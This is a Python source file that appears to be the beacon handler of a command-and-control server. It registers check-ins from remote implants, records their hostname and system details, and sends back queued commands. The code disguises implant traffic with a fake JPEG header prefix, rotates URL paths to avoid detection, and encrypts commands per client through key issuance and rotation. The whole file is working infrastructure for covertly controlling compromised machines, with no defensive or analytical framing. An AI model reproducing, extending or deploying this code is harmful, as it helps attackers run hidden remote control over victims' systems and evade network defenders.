import logging
import json
import base64
import re

logger = logging.getLogger(__name__)

from handlers.base_handler import BaseHandler

class BeaconHandler(BaseHandler):
    """Handler for beacon requests from clients"""
    
    def handle(self, include_rotation_info=False):
        """
        Process a beacon request from a client
        
        Args:
            include_rotation_info: Whether to include path rotation information
        """
        self.log_message(f"Beacon received from {self.client_address[0]}")
        
        try:
            # Read content data - now client info is in the request body
            content_length = int(self.headers.get('Content-Length', 0))
            if content_length == 0:
                self.send_error_response(400, "Missing content")
                return
                
            request_body = self.request_handler.rfile.read(content_length).decode('utf-8')
            
            # Parse the JSON body
            try:
                body_data = json.loads(request_body)
                client_id = body_data.get('client_id')
                system_info_raw = body_data.get('data')
                rotation_id = body_data.get('rotation_id')
                
                # Strip JPEG headers if present
                if system_info_raw and isinstance(system_info_raw, str):
                    # Check for JPEG header patterns
                    if system_info_raw.startswith("0xFFD8FF"):
                        system_info_raw = system_info_raw[8:]  # Remove the exact 8 characters
                        self.log_message(f"Removed JPEG header prefix '0xFFD8FF' from data")
                    elif system_info_raw.startswith("FFD8FF"):
                        system_info_raw = system_info_raw[6:]  # Remove the exact 6 characters
                        self.log_message(f"Removed JPEG header prefix 'FFD8FF' from data")
                
                # Log the received client ID to verify
                self.log_message(f"Client ID from request body: {client_id}")
            except json.JSONDecodeError:
                self.send_error_response(400, "Invalid JSON format")
                return
            
            # Identify the client using the data from request body
            client_id, system_info, newly_identified, first_contact = self.client_helper.identify_client_from_body(
                self.client_address[0], 
                client_id,
                system_info_raw
            )
            
            # Log the beacon
            self.log_message(f"Identified client {client_id} ({system_info.get('Hostname', 'Unknown')}){' - FIRST CONTACT' if first_contact else ''}")
            
            # Verify client if system info is available and not first contact
            needs_key_rotation = False
            if system_info and not first_contact:
                _, _, needs_key_rotation, _ = self.client_helper.verify_client(client_id, system_info)
            
            # Organize commands for the client
            commands, has_key_operation = self.client_helper.organize_commands(
                client_id, 
                include_key_rotation=needs_key_rotation,
                first_contact=first_contact
            )
            
            # Add path rotation command if needed for established clients
            if include_rotation_info and not first_contact:
                path_rotation_command = self.path_router.create_path_rotation_command()
                commands.append(path_rotation_command)
                self.log_message(f"Sending path rotation info to client {client_id}")
            
            # Log commands being sent
            for command in commands:
                cmd_type = command['command_type']
                args = command['args'] if cmd_type not in ['key_rotation', 'key_issuance'] else '[REDACTED KEY]'
                self.client_manager.log_event(client_id, "Command sent", f"Type: {cmd_type}, Args: {args}")
            
            # Send response to client
            self._send_beacon_response(client_id, commands, has_key_operation, first_contact, include_rotation_info)
            
            # Clear key rotation commands after delivery
            if has_key_operation and not first_contact:
                self.client_helper.clear_commands_after_rotation(client_id)
                
        except Exception as e:
            logger.error(f"Error handling beacon: {str(e)}")
            self.send_error_response(500, "Internal server error")
    
    def _send_beacon_response(self, client_id, commands, has_key_operation, first_contact, include_rotation_info):
        """Send the response to the client beacon"""
        # Prepare response data
        response_data = {
            "commands": commands,
            "first_contact": first_contact,
            "encrypted": False
        }
        
        # Add key operation flags
        if has_key_operation:
            if first_contact:
                response_data["key_issuance"] = True
            else:
                response_data["key_rotation"] = True
        
        # Add path rotation info if requested - NOW INCLUDED IN RESPONSE BODY
        if include_rotation_info:
            rotation_info = self.path_router.get_rotation_info()
            response_data["rotation_info"] = rotation_info
        else:
            # Always include basic rotation info for established clients
            rotation_info = {
                "current_rotation_id": self.path_router.path_manager.rotation_counter,
                "next_rotation_time": self.path_router.path_manager.get_next_rotation_time()
            }
            response_data["rotation_info"] = rotation_info
        
        # For established clients with encryption, encrypt the commands
        if not first_contact and commands:
            # Convert commands to JSON string for encryption
            commands_json = json.dumps(commands)
            
            # Encrypt the commands
            encrypted_commands = self.crypto_helper.encrypt(commands_json, client_id)
            
            # Replace commands with encrypted version
            response_data["commands"] = encrypted_commands
            response_data["encrypted"] = True
        
        # Send the response as JSON
        self.send_response(200, "application/json", json.dumps(response_data))